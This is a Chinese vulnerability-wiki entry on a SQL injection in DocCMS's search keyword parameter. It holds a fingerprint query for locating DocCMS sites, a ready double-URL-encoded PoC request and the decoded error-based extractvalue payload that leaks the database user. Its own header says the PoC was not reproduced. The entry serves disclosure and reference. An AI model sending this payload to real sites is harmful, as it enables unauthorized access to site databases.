---
version: "DocCMS"
source: "Threekiii/Vulnerability-Wiki"
product: "DocCMS"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "DocCMS-keyword-SQL注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：Version unknown; search keyword double decode; MySQL XML error function"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-d6629a51dff4f94414293ee0"
entity_id: "ve-d6629a51dff4f94414293ee0"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Version unknown; search keyword double decode; MySQL XML error function

- **来源与引用处置（1）**：Substantively identical109, only image folder/source repository/footer differ。保留这部分来源材料并与技术结论分开；其引用或宣传内容不能补足本文漏洞的证据。

- **事实待核（2）**：Product mistakenly fills version; no source flow or precise affected range。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# DocCMS keyword SQL注入漏洞

## 漏洞描述

DocCMS keyword参数存在 SQL注入漏洞，攻击者通过漏洞可以获取数据库信息

## 漏洞影响

```
DocCMS
```

## 网络测绘

```
app="Doccms"
```

## 漏洞复现

CMS官网

![](./.resource/DocCMS-keyword-SQL注入漏洞/media/202202170903272.png)

验证POC

```plain
/search/index.php?keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33
```

![](./.resource/DocCMS-keyword-SQL注入漏洞/media/202202170903242.png)

其中payload为下列语句的二次Url编码

```plain
' and (extractvalue(1,concat(0x7e,(select user()),0x7e)))#
```

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
